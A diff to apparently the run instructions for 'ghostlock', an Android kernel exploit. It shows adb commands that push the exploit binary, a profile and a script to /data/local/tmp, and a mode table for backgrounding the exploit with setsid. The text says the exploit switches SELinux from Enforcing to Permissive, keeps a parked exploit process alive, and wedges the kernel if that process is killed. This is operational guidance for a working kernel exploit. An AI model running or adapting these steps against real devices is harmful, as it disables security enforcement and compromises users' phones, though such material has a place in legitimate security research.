@@ -17,9 +17,22 @@ adb push <build>/ghostlock        /data/local/tmp/gl-w1/ghostlock   # md5 281fcd
 adb push gl-w1-profile.bin        /data/local/tmp/gl-w1/profile.bin # md5 8b0ed66432e66f81ea9b9fd8ecdeb13f
 adb push w1-selinux.sh            /data/local/tmp/gl-w1/w1.sh
 adb shell chmod 755 /data/local/tmp/gl-w1/ghostlock /data/local/tmp/gl-w1/w1.sh
-adb shell sh /data/local/tmp/gl-w1/w1.sh        # prints "before: enforce=Enforcing (1)"
-adb shell getenforce                            # -> Permissive when it lands
+
+adb shell sh /data/local/tmp/gl-w1/w1.sh            # start, wait for the store, exit
+adb shell sh /data/local/tmp/gl-w1/w1.sh --status   # just report state
 ```
+
+Modes:
+
+| mode | behaviour |
+|---|---|
+| default | `setsid ./ghostlock … &`, poll `w1.log` for `Write 1 complete` (the store takes ~11 s), print `enforce=…`, **exit 0**. The exploit keeps running. |
+| `--foreground` | `exec ./ghostlock …` — blocks here, as before (the exploit parks). |
+| `--status` | print `getenforce`, the `ghostlock` process and the last log lines; run nothing. |
+
+The script returning is safe — it is the *parked exploit process* that must stay
+alive (`setsid` keeps it across the shell exiting and an adb disconnect).  Killing
+that process is what wedges the kernel; a reboot is the clean exit.
 
 Three things the script warns about, all measured:
 
